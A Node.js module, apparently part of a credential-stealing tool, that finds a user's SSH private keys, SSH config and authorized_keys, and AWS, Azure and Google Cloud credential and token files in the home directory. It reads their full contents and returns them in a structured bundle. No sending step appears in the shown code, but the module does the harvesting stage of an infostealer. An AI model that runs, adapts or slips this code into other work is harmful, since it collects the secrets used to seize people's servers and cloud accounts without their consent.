const fs = require("fs");
const path = require("path");
const os = require("os");
const logger = require("../utils/logger");

const SSH_DIR = path.join(os.homedir(), ".ssh");
const AWS_DIR = path.join(os.homedir(), ".aws");
const AZURE_DIR = path.join(os.homedir(), ".azure");
const GCLOUD_DIR = path.join(os.homedir(), ".config", "gcloud");

const SSH_FILES = ["id_rsa", "id_ed25519", "id_ecdsa", "id_dsa", "config", "known_hosts", "authorized_keys"];
const AWS_FILES = ["credentials", "config"];
const AZURE_FILES = ["azureProfile.json", "accessTokens.json"];
const GCLOUD_FILES = ["credentials.db", "access_tokens.db", "application_default_credentials.json"];

const MAX_SIZE = 100 * 1024;

function readFileSafe(filePath) {
    try {
        const stat = fs.statSync(filePath);
        if (!stat.isFile()) return null;
        if (stat.size > MAX_SIZE) return "[File exceeds 100KB limit]";
        return fs.readFileSync(filePath, "utf8");
    } catch {
        return null;
    }
}

function scanDir(baseDir, filenames, category) {
    const results = [];
    if (!fs.existsSync(baseDir)) return results;
    for (const name of filenames) {
        const fullPath = path.join(baseDir, name);
        const content = readFileSafe(fullPath);
        if (content !== null) {
            results.push({ path: fullPath, name, category, content });
        }
    }
    return results;
}

function findSecretFiles() {
    const sshKeys = scanDir(SSH_DIR, SSH_FILES, "ssh");
    const aws = scanDir(AWS_DIR, AWS_FILES, "aws");
    const azure = scanDir(AZURE_DIR, AZURE_FILES, "azure");
    const gcloud = scanDir(GCLOUD_DIR, GCLOUD_FILES, "gcloud");

    const all = [...sshKeys, ...aws, ...azure, ...gcloud];
    logger.info(`Found ${all.length} secret/credential files`);
    return {
        sshKeys,
        cloudCreds: [...aws, ...azure, ...gcloud],
        totalFound: all.length,
        files: all
    };
}

module.exports = { findSecretFiles };
